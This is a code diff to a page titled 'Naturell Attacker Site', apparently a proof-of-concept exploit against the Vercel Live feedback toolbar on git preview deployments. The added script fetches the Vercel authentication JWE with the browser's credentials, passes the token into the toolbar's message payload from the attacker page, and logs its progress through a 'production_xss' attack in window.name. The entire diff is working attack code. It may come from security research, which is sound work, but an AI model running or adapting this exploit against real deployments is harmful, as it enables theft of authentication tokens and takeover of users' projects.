@@ -7,6 +7,7 @@
   const DOM_MARKER = 'naturell_toolbar_git_preview_production_xss_20260809';
   const SOURCE_MARKER = 'naturell_git_preview_delivery_source_20260809';
   const SHARE_SETUP = new URLSearchParams(location.search).get('shareSetup') === '1';
+  let vercelAuthJWE = null;
 
   window.__naturellDelivery = {
     sourceMarker: SOURCE_MARKER,
@@ -26,13 +27,60 @@
     shareSetup: SHARE_SETUP,
     shareSetupAuthenticated: false,
     shareTeamId: null,
+    jweFetchStatus: null,
+    jwePresent: false,
   };
+
+  function recordSafeState() {
+    const state = window.__naturellDelivery;
+    window.name = `naturell-toolbar-git:${JSON.stringify({
+      phase: state.phase,
+      readyAccepted: state.readyAccepted,
+      initAccepted: state.initAccepted,
+      uploadAccepted: state.uploadAccepted,
+      pushAccepted: state.pushAccepted,
+      jweFetchStatus: state.jweFetchStatus,
+      jwePresent: state.jwePresent,
+    })}`;
+  }
 
   function setPhase(phase) {
     window.__naturellDelivery.phase = phase;
     if (document.documentElement) {
       document.documentElement.dataset.deliveryPhase = phase;
     }
+    recordSafeState();
+  }
+
+  function loadToolbar() {
+    const script = document.createElement('script');
+    script.async = true;
+    script.dataset.explicitOptIn = 'true';
+    script.src = 'https://vercel.live/_next-live/feedback/feedback.js';
+    document.head.append(script);
+  }
+
+  async function prepareToolbar() {
+    if (!SHARE_SETUP) {
+      setPhase('jwe-fetching');
+      try {
+        const response = await fetch('/.well-known/vercel/jwe', {
+          credentials: 'include',
+          cache: 'no-store',
+        });
+        window.__naturellDelivery.jweFetchStatus = response.status;
+        if (response.status === 200) {
+          vercelAuthJWE = await response.text();
+        }
+      } catch {}
+      window.__naturellDelivery.jwePresent = Boolean(vercelAuthJWE);
+      if (!vercelAuthJWE) {
+        setPhase('jwe-unavailable');
+        return;
+      }
+    }
+    setPhase('waiting-for-toolbar-ready');
+    loadToolbar();
   }
 
   function randomHex(byteCount) {
@@ -106,6 +154,7 @@
           hostname: PRODUCTION_HOST,
           deploymentId: '',
           path: '/',
+          vercelAuthJWE,
         },
         origin: LIVE_ORIGIN,
         page: '/',
@@ -229,14 +278,9 @@
     }
   });
 
-  setPhase('waiting-for-toolbar-ready');
+  prepareToolbar();
 })();
 </script>
-<script
-  async
-  data-explicit-opt-in="true"
-  src="https://vercel.live/_next-live/feedback/feedback.js"
-></script>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Naturell Attacker Site</title>
